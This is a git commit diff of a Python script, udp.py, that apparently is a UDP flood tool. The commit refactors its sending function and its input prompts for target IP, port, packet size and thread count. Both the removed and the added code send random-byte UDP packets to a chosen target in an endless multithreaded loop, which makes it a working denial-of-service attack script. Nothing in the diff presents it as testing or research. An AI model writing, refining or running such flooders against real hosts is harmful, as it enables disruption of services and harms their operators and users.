346e41b98587c7a8364415c1f0353d104164fe00
BitBopALT <altmwgga@gmail.com>
2024-06-12 18:43:07 -0300

    udp.py

--- udp.py
+++ udp.py
@@ -15,22 +15,19 @@ def is_valid_ipv4(ip):
     except ipaddress.AddressValueError:
         return False
 
-def run(ip, port, times):
-    data = random._urandom(1024)
-    try:
-        while True:
-            print(f"[*] Sending UDP packets to {ip}:{port}!")
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            addr = (str(ip), int(port))
-            for _ in range(times):
-                s.sendto(data, addr)
-            s.close()
-    except KeyboardInterrupt:
-        print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
-        sys.exit(0)
-    except Exception as e:
-        print(f"[!] Error: {e}")
-        sys.exit(1)
+def send_packets(ip, port, packet_size):
+    data = random._urandom(packet_size)
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    addr = (str(ip), int(port))
+    while True:
+        try:
+            s.sendto(data, addr)
+        except KeyboardInterrupt:
+            print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
+            sys.exit(0)
+        except Exception as e:
+            print(f"[!] Error: {e}")
+            break
 
 def main():
     print("\n█░█░█▀▄░█▀█      ▀█▀ █▀█ █▀█ █▀ ▀█▀ █▀▀ █▀█")
@@ -70,26 +67,18 @@ def main():
 
     while True:
         try:
-            times_input = input("[#] Enter packets per connection: ")
-            if times_input.strip():
-                times = int(times_input)
-                break
-            else:
-                print("[!] Invalid input. Please enter a valid integer for the packets.")
+            packet_size = int(input("[#] Enter packet size (bytes): "))
+            break
         except ValueError:
-            print("[!] Invalid input. Please enter a valid integer for the packets.")
+            print("[!] Invalid input. Please enter a valid integer for the packet size.")
         except KeyboardInterrupt:
             print("\n[!] Script terminated by user (Ctrl+C). Exiting.")
             sys.exit(0)
 
     while True:
         try:
-            threads_input = input("[#] Enter number of threads: ")
-            if threads_input.strip():
-                threads = int(threads_input)
-                break
-            else:
-                print("[!] Invalid input. Please enter a valid integer for the threads.")
+            threads = int(input("[#] Enter number of threads: "))
+            break
         except ValueError:
             print("[!] Invalid input. Please enter a valid integer for the threads.")
         except KeyboardInterrupt:
@@ -97,7 +86,7 @@ def main():
             sys.exit(0)
 
     for _ in range(threads):
-        th = threading.Thread(target=run, args=(ip, port, times))
+        th = threading.Thread(target=send_packets, args=(ip, port, packet_size))
         th.start()
 
 if __name__ == "__main__":
